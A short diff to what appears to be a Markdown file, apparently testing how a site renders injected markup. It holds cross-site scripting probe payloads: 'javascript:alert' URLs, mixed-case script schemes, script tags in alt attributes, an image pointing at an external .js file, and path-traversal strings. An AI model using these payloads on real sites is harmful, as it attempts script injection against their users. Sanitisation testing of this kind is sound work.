@@ -7,7 +7,7 @@
 ![text](https://avatars.githubusercontent.com/u/92805783?s=40&javascript:alert(1);)
 ![
 
-<img src="JaVaScRiPt:alert('XSS')" alt="<SCRIPT>alert()</SCRIPT>">
-<img color='../../../../../../../r89shi/gitbook.fluig.snippets/blob/main/README.md' >
+<img src="https://github.com/r89shi/r89shi.github.io/blob/master/teste.js" alt="<SCRIPT>alert()</SCRIPT>">
+<img src='../../../../../../../r89shi/gitbook.fluig.snippets/blob/main/README.md' >
 
 ](()
